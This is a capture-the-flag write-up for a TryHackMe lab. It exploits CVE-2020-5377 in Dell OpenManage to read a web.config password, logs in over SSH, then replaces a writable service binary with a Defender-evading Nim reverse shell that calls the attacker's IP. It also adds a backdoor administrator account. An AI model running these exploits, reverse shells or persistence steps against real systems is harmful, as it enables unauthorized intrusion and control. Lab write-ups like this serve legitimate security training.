- - - 
created : 28-07-2025 

Tags : #medium #detailed 
- - - 
# Objective

Can you hack the hackers?

Your mission is to infiltrate the web server of the notorious Hack Smarter APT (Advanced Persistent Threat) group. This group is known for conducting malicious cyber activities, and it's imperative that we gather intel on their upcoming targets.

The Hack Smarter APT operates a well-protected web server, fortified with advanced security measures. Your objective is to compromise their server undetected, extract the list of upcoming targets, and leave no trace of your presence.

To begin, you'll need to employ your extensive hacking skills and exploit any vulnerabilities in their server's defenses. Remember, stealth and discretion are key. You must avoid triggering any alarms that could lead to a premature shutdown of the server or alert the Hack Smarter APT group to your presence.

Once you gain access to their server, navigate through their intricate network infrastructure, bypassing firewalls, encryption protocols, and other security layers. Locate the central repository where they store sensitive information, including their upcoming target list. Intel has reported this is located on the desktop of the Administrator user. 

Exercise caution as you retrieve the list. The Hack Smarter APT group is known for employing countermeasures such as intrusion detection systems and advanced monitoring tools. It's crucial that you maintain a low profile and avoid leaving any traces that could compromise the mission or endanger your own safety.

Upon successfully acquiring the list of upcoming targets, transmit the data to our secure server using encrypted channels. This will ensure that our analysts can analyze the information and take appropriate action to protect potential targets from cyber attacks.

Remember, this is a high-stakes mission, and the information you gather will be instrumental in dismantling the Hack Smarter APT group's operations. Good luck, and may your skills lead you to success in this mission.
# Recon

First we add the target IP to our /etc/hosts file, we use [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) with `sudo nano /etc/hosts` :

![Pasted image 20250728143501.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728143501.png)
Now we can save it with `ctrl+X` > `y` > `enter` .
## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ rustscan -a hss.thm -- -A  

Open 10.10.142.189:21
Open 10.10.142.189:22
Open 10.10.142.189:80
Open 10.10.142.189:1311
Open 10.10.142.189:3389
Open 10.10.142.189:7680

PORT     STATE    SERVICE       REASON          VERSION
21/tcp   open     ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT

22/tcp   open     ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)

80/tcp   open     http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HackSmarterSec

1311/tcp open     ssl/rxmon?    syn-ack ttl 127

3389/tcp open     ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services

7680/tcp filtered pando-pub     no-response
```
# Enumeration
## FTP (21)

We can manually check if we have anonymous access while waiting for nmap results :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ ftp anonymous@hss.thm 
Connected to hss.thm.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49734|)
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
```

So we have some files, let's download to our directory :

```bash
ftp> get
(remote-file) Credit-Cards-We-Pwned.txt
(local-file) Credit-Cards-We-Pwned.txt
local: Credit-Cards-We-Pwned.txt remote: Credit-Cards-We-Pwned.txt
229 Entering Extended Passive Mode (|||49753|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************|  3722       23.03 KiB/s    00:00 ETA
226 Transfer complete.
3722 bytes received in 00:00 (22.96 KiB/s)
```
## HTTP (80)

Main page :

![Pasted image 20250728150105.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728150105.png)
### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://hss.thm    
/Images               (Status: 301) [Size: 145] [--> http://hss.thm/Images/]
/css                  (Status: 301) [Size: 142] [--> http://hss.thm/css/]
/images               (Status: 301) [Size: 145] [--> http://hss.thm/images/]
/index.html           (Status: 200) [Size: 3998]
/js                   (Status: 301) [Size: 141] [--> http://hss.thm/js/]
Progress: 4746 / 4747 (99.98%)
```

We can check for vhosts too, first we run then we have a lot of false positive so we add `--exclude-length` parameter with `334` value :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://hss.thm --exclude-length 334
```

And we don't have results.
## SSL (1311)

![Pasted image 20250728150646.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728150646.png)

So we have a login panel.

We can go to about for more info :

![Pasted image 20250728151146.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728151146.png)
# Exploit
## Google Searching

We can search for OpenManage 9.4.0.2 [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and we find Tyler's update to the [CVE-2020-5377](../../3%20-%20Tags/CVEs/CVE-2020-5377.md) (creator of the room) on [Github](../../3%20-%20Tags/Hacking%20Concepts/Github.md) :

![Pasted image 20250728152017.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728152017.png)

So we copy the script and create the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) file in our directory with [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) and make it executable with `chmod +x *.py`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ cat CVE-2020-5377.py 
# This is a proof of concept for CVE-2020-5377, an arbitrary file read in Dell OpenManage Administrator
# Proof of concept written by: David Yesland @daveysec with Rhino Security Labs
# More information can be found here: 
...
...
```

Now we can use it :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ python3 CVE-2020-5377.py                  
Usage: python CVE-2020-5377.py <yourIP> <targetIP>:<targetPort>

┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ python3 CVE-2020-5377.py  10.8.162.183 10.10.142.189:1311
Session: 986C73BB77D23F1088E60F2A2F7EBAFA                                                       
VID: 5B3F064309FD2B6E
file > 
```

We know it's [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md) so let's search for standard interesting files :

```bash
file > /windows/system32/drivers/etc/hosts                                                 
Reading contents of /windows/system32/drivers/etc/hosts:
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
```

Works, now let's try to read the `web.config` files in their standard directory :

```bash
file > \inetpub\wwwroot\hacksmartersec\web.config
Reading contents of \inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```

There we go, we have username and a password.
## First Access SSH (22)

We can try password reuse on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ ssh tyler@hss.thm           
The authenticity of host 'hss.thm (10.10.142.189)' can't be established.
ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hss.thm' (ED25519) to the list of known hosts.
tyler@hss.thm's password: 
Microsoft Windows [Version 10.0.17763.1821] 
(c) 2018 Microsoft Corporation. All rights reserved.

Directory of C:\Users\tyler\Desktop

06/30/2023  07:12 PM    <DIR>          .
06/30/2023  07:12 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/27/2023  09:42 AM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,109,655,040 bytes free

tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txt 
THM{4ll15n0tw3llw1thd3ll} 
```

And we have the flag.
# Privilege Escalation

Starting our [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we check for actual privileges :

```
tyler@HACKSMARTERSEC C:\Users>whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
hacksmartersec\tyler S-1-5-21-1966530601-3185510712-10604624-1008


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Nothing interesting.

We check for processes with `ps`(at first i wasn't able to execute this command so i entered the powershell with the command `powershell` and there it worked)  and we find **spoofer-scheduler** and we can stop and start it, maybe we can use it to obtain a root Shell :

```powershell
PS C:\Users\tyler\Desktop> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    146      10    15484      14072              3820   0 amazon-ssm-agent
     88       7     3064       5124       0.11    744   0 cmd
     78       5     3324       4076       0.02   2124   0 cmd
     77       5     2356       3992       0.02   2560   0 cmd
     78       5     2344       4020       0.02   2688   0 cmd
     88       6     3328       5112       0.11   3716   0 cmd
    107       6     1540       5220       0.61   1012   0 conhost
    114       7     1228       5020       0.06   1664   0 conhost
    152       9     6612      12500              1736   0 conhost
    109       6     1484       5224       0.48   3040   0 conhost
    151       9     6612      13136              3908   0 conhost
    385      15     2200       5256               388   0 csrss
    161       9     1640       4716               464   1 csrss
    717      35   179384     158100              1876   0 dsm_om_connsvc64
    539      22    15972      38132               924   1 dwm
     49       6     1580       4596               748   0 fontdrvhost
     49       6     1628       4796               752   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    462      25    11216      43256              3052   1 LogonUI
    980      23     5556      15540               620   0 lsass
    222      13     3108      10208              3560   0 msdtc
    710      93   269044     237920              2092   0 MsMpEng
    208      11     4028      10904              3420   0 NisSrv
    653      51   147096     157012       8.02   1160   0 powershell
    597      26    70796      80176       1.06   2768   0 powershell
      0      12      300      21736                84   0 Registry
    237      11     2496      11064               520   0 SecurityHealthService
    328      10     4216       8324               600   0 services
     53       3      496       1200               280   0 smss
    204      11     1744       8804              1688   0 'spoofer-scheduler'
    467      22     5684      16592              1768   0 spoolsv
    131      10     2268       7344       0.06   1432   0 sshd
    120      19     1552       6988              2084   0 sshd
    124       9     2032       7652              2628   0 sshd
    171      11    16220      17512              3896   0 ssm-agent-worker
    530      17    12044      18520               644   0 svchost
    583      17     4600      14396               724   0 svchost
    574      16     3192       9252               840   0 svchost
    573      20     4688      14616               944   0 svchost
    441      26     8892      16580               976   0 svchost
   1313      44    31088      54648              1036   0 svchost
    503      27     7100      17776              1044   0 svchost
    312      11     2000       8796              1132   0 svchost
    756      41     9148      23472              1140   0 svchost
    397      31     9196      17132              1268   0 svchost
    354      16    10240      14904              1332   0 svchost
    158       8     1452       6376              1624   0 svchost
    200      11     1572       7088              1916   0 svchost
    232      14     4696      11904              1920   0 svchost
    324      16     4536      12080              1932   0 svchost                                                                   
    164      11     3812      10824              1940   0 svchost
    198      10     2084       8064              2152   0 svchost
    162      10     1840       7240              2616   0 svchost
    143       8     3128      10524              2824   0 svchost
    188      11     3300      11100              3200   0 svchost
   1328       0      192        152                 4   0 System
    162      13     4896      12064       0.06    740   0 win32calc
    172      11     1356       6772               512   0 wininit
    250      12     2604      15728               532   1 winlogon

PS C:\Users\tyler\Desktop> sc.exe qc spoofer-scheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Spoofer Scheduler
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem


```

Let's check if we can write in that folder and replace the file and stop/ restart the service :

```powershell
PS C:\Program Files (x86)\Spoofer> echo test > test.txt 
PS C:\Program Files (x86)\Spoofer> ls 


    Directory: C:\Program Files (x86)\Spoofer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/24/2020   9:31 PM          16772 CHANGES.txt
-a----        7/16/2020   7:23 PM           7537 firewall.vbs
-a----        7/24/2020   9:31 PM          82272 LICENSE.txt
-a----        7/24/2020   9:31 PM           3097 README.txt
-a----        7/24/2020   9:31 PM          48776 restore.exe
-a----        7/20/2020  11:12 PM         575488 scamper.exe
-a----        6/30/2023   6:57 PM            152 shortcuts.ini
-a----        7/24/2020   9:31 PM        4315064 spoofer-cli.exe
-a----        7/24/2020   9:31 PM       16171448 spoofer-gui.exe
-a----        7/24/2020   9:31 PM        4064696 spoofer-prober.exe
-a----        7/24/2020   9:31 PM        8307640 spoofer-scheduler.exe
-a----        7/28/2025   4:40 PM             14 test.txt
-a----        7/24/2020   9:31 PM            667 THANKS.txt
-a----        7/24/2020   9:31 PM         217416 uninstall.exe

PS C:\Program Files (x86)\Spoofer> sc.exe stop spoofer-scheduler

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0

PS C:\Program Files (x86)\Spoofer> sc.exe start spoofer-scheduler

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3600
        FLAGS              :

```

We are able to write to that, and to stop/start the spoofer service so this seems the main path to privesc.
## WinPEAS

We can use [WinPEAS](../../3%20-%20Tags/Hacking%20Tools/WinPEAS.md) to try to find other vectors for privesc, let's copy it to our working directory, then we host a simple http server with [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ locate winpeas
/usr/bin/winpeas
/usr/share/applications/kali-winpeas.desktop
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/kali-winpeas.svg
/usr/share/icons/Flat-Remix-Blue-Dark/apps/scalable/winpeas.svg
/usr/share/icons/hicolor/16x16/apps/kali-winpeas.png
/usr/share/icons/hicolor/22x22/apps/kali-winpeas.png
/usr/share/icons/hicolor/24x24/apps/kali-winpeas.png
/usr/share/icons/hicolor/256x256/apps/kali-winpeas.png
/usr/share/icons/hicolor/32x32/apps/kali-winpeas.png
/usr/share/icons/hicolor/48x48/apps/kali-winpeas.png
/usr/share/icons/hicolor/scalable/apps/kali-winpeas.svg
/usr/share/kali-menu/applications/kali-winpeas.desktop
/usr/share/peass/winpeas
/usr/share/peass/winpeas/winPEAS.bat
/usr/share/peass/winpeas/winPEAS.ps1
/usr/share/peass/winpeas/winPEASany.exe
/usr/share/peass/winpeas/winPEASany_ofs.exe
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx64_ofs.exe
/usr/share/peass/winpeas/winPEASx86.exe
/usr/share/peass/winpeas/winPEASx86_ofs.exe

┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ cp /usr/share/peass/winpeas/winPEASx86.exe .

┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Now we can download it to our target machine :

```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>curl http:/10.8.162.183/winPEASx86.exe -o winPEASx86.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 9918k  100 9918k    0     0  1653k      0  0:00:06  0:00:06 --:--:-- 1991k

tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>dir 
 Volume in drive C has no label.     
 Volume Serial Number is A8A4-C362   
 
 Directory of C:\Users\tyler\Desktop 

07/28/2025  02:04 PM    <DIR>          .
07/28/2025  02:04 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/27/2023  09:42 AM                25 user.txt
07/28/2025  02:04 PM        10,156,032 winPEASx86.exe
               4 File(s)     10,157,138 bytes
               2 Dir(s)  14,098,526,208 bytes free
```

We have it in our Desktop now we can run it :

```
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>.\winpeas.exe
The system cannot execute the specified program.
```

Seems [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md) Defender is blocking the file, we have to find another way, i tried .bat, .ps1, even obfuscated ones will not work.
## Bypass Windows Defender

1. **Objective:** Compiling a reverse shell written in the Nim programming language.
2. **Purpose:** This is done to evade detection by Windows Defender.
3. **Execution Plan:** The compiled binary of the reverse shell will be used to replace the original binary on the target machine.
4. **Trigger:** When the service associated with the replaced binary is stopped and then started by the user.
5. **Outcome:** The new malicious binary will be executed instead of the original one.
6. **Result:** This will establish a reverse shell connection with high privileges, potentially granting unauthorized access to the target machine.

The machine doesn't receive updates so there's something we can try with [Nim](../../3%20-%20Tags/Programming%20Languages/Nim.md) [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) :

![Pasted image 20250728170218.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250728170218.png)

We copy the code and make the file :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ cat revshell.nim 
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "10.8.162.183"
  v2 = "1337"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"
  ...
  ...
```

Now we have to do some steps :

1. Install [Nim](../../3%20-%20Tags/Programming%20Languages/Nim.md) and add the Nimble dir to our PATH : 
```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ curl https://nim-lang.org/choosenim/init.sh -sSf | sh
choosenim-init: Downloading choosenim-0.8.16_linux_amd64
Downloading Nim 2.2.4 from nim-lang.org
[##################################################] 100.0% 0kb/s
 Extracting nim-2.2.4-linux_x64.tar.xz
 Extracting nim-2.2.4-linux_x64.tar
   Building Nim 2.2.4
  Compiler: Already built
  Installed component 'nim'
  Installed component 'nimble'
  Installed component 'nimgrep'
  Installed component 'nimpretty'
  Installed component 'nimsuggest'
  Installed component 'testament'
  Installed component 'nim-gdb'
   Switched to Nim 2.2.4
choosenim-init: ChooseNim installed in /home/mdn0x/.nimble/bin
choosenim-init: You must now ensure that the Nimble bin dir is in your PATH.
choosenim-init: Place the following line in the ~/.profile or ~/.bashrc file.
choosenim-init:     export PATH=/home/mdn0x/.nimble/bin:$PATH
                                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ export PATH=/home/mdn0x/.nimble/bin:$PATH
                                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ nim --version 
Nim Compiler Version 2.2.4 [Linux: amd64]
Compiled at 2025-04-22
Copyright (c) 2006-2025 by Andreas Rumpf

git hash: f7145dd26efeeeb6eeae6fff649db244d81b212d
active boot switches: -d:release

```

2. Now we compile the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) with it and rename it like `spoofer-scheduler.exe`:
```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ nim c -d:mingw --app:gui  --opt:speed  -o:spoofer-scheduler.exe revshell.nim 
Hint: used config file '/home/mdn0x/.choosenim/toolchains/nim-2.2.4/config/nim.cfg' [Conf]
Hint: used config file '/home/mdn0x/.choosenim/toolchains/nim-2.2.4/config/config.nims' [Conf]
.......................................................................................................................................
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/system/exceptions.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/private/digitsutils.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/assertions.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/system/dollars.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/system/repr_v2.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/widestrs.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/syncio.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/system.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/parseutils.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/strutils.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/dynlib.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/windows/winlean.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/oserrors.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/times.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/private/ospaths2.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/private/win_setenv.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/cmdline.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/os.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/nativesockets.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/std/monotimes.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/net.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/streams.nim
CC: ../../../../.choosenim/toolchains/nim-2.2.4/lib/pure/osproc.nim
CC: revshell.nim
Hint:  [Link]
Hint: mm: orc; threads: on; opt: speed
62053 lines; 3.487s; 91.586MiB peakmem; proj: /home/mdn0x/THM/CHALLENGES/Medium/HackSmarterSEC/revshell.nim; out: /home/mdn0x/THM/CHALLENGES/Medium/HackSmarterSEC/spoofer-scheduler.exe [SuccessX]
                                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ ls
Credit-Cards-We-Pwned.txt  revshell.nim  spoofer-scheduler.exe  
```

We have our file, first we rename the original one on the target to backup it somehow :

```powershell
PS C:\Program Files (x86)\Spoofer> mv .\spoofer-scheduler.exe spoofer-scheduler-backup.exe
```

Now let's host the server again and download the new file in the directory :

```powershell
PS C:\Program Files (x86)\Spoofer> wget http://10.8.162.183/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

Now we open our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash                                                                                                                               
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ nc -lvnp 8080                                                               
listening on [any] 8080 ...

```

And we stop and start the service on the target machine :

```powershell
PS C:\Program Files (x86)\Spoofer> sc.exe stop spoofer-scheduler     

PS C:\Program Files (x86)\Spoofer> sc.exe start spoofer-scheduler
```

And we have it :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.142.189] 50124
C:\Windows\system32>   
```

The problem here is the shell will not be persistent and will time out so we have to make it somehow.

## Shell Persistence

Since we can run commands before disconnecting, we can add a new user to the Administrator group to access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ nc -lvnp 8080                     
listening on [any] 8080 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.142.189] 50150
C:\Windows\system32> net user mdn0x HackSmarter123 /add
The command completed successfully.

C:\Windows\system32> net localgroup administrators mdn0x /add
The command completed successfully.
```

Now we can access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Medium/HackSmarterSEC]
└─$ ssh mdn0x@hss.thm
mdn0x@hss.thm's password: 
(c) 2018 Microsoft Corporation. All rights reserved.
 
mdn0x@HACKSMARTERSEC C:\Users\mdn0x>
```

We can find the Targets directory and the file :

```powershell
PS C:\Users\Administrator\Desktop\Hacking-Targets> ls


    Directory: C:\Users\Administrator\Desktop\Hacking-Targets


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/27/2023   9:40 AM             53 hacking-targets.txt


PS C:\Users\Administrator\Desktop\Hacking-Targets> cat .\hacking-targets.txt
Next Victims:  
CyberLens, WorkSmarter, SteelMountain
```

Awesome.